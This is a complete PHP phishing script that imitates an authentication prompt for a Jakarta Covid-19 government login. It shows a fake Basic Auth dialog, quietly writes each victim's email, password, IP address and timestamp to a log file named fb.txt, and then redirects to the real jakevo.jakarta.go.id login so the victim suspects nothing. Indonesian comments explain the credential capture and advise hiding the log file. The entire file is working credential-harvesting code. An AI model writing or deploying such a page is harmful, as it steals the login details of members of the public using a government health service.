<?php
if (empty($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="Jakarta Covid19 Application Security Authentication"');
    header('HTTP/1.0 401 Unauthorized');
   	echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<HTML>
<HEAD>
<TITLE>Jakarta Covid19 Application Security Authentication</TITLE>
<META 
     HTTP-EQUIV="Refresh"
     CONTENT="1; URL=https://jakevo.jakarta.go.id/login">
</HEAD>
<BODY>
<b>Authentication failed. Please try again</b>
</BODY>
</HTML>';
    exit;
} else {
	$ip = getenv ('REMOTE_ADDR'); //record ip addressnya dia
	$nama_log_file = "fb.txt";
	$date=date("d/M/y g:i:s a"); //record waktu kejadian
	// $referer=getenv ('HTTP_REFERER'); //record alamat di URL
	$fl = fopen($nama_log_file, 'a'); //kalau mau, rename log.txt jadi susah ditebak
	$em=$_SERVER["PHP_AUTH_USER"]; //record email dia
	$pw=$_SERVER["PHP_AUTH_PW"]; //record pwd dia
	
	if (fwrite($fl,"\r\n$ip;;$date;;$browser\r\n$em;;$pw\r\n---\r\n") === FALSE) {
	        echo "gagal nulis log ke dalam file " . $nama_log_file;
	        exit;
	}
	
	fclose($fl);
	
    header("location: https://jakevo.jakarta.go.id/login");
}
?>
